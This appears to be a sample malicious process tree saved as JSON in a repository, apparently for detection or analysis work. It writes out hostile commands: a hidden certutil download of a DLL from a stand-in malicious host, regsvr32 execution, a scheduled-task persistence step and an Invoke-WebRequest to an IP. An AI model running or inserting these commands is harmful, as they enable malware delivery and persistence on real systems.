Sample malicious process chain (saved as JSON in repo):

{
  "ProcessTree": {
    "chrome.exe": "hxxps://abcxyz.site/test.zip",
    "explorer.exe": {
      "cmd.exe": "C:\\Users\\user\\Downloads\\test.zip",
      "powershell.exe": "Expand-Archive -Path test.zip -DestinationPath unzipped",
      "wscript.exe": "unzipped\\test.js",
      "powershell.exe (hidden)": "certutil -urlcache -split -f http://malicious.site/test.dll Temp\\test.dll",
      "regsvr32.exe": "Temp\\test.dll",
      "schtasks.exe": "Updater task - daily execution",
      "svch0st.exe": "",
      "powershell.exe (hidden)": "Invoke-WebRequest -Uri http://123.45.67.89/data"
    }
  }
}
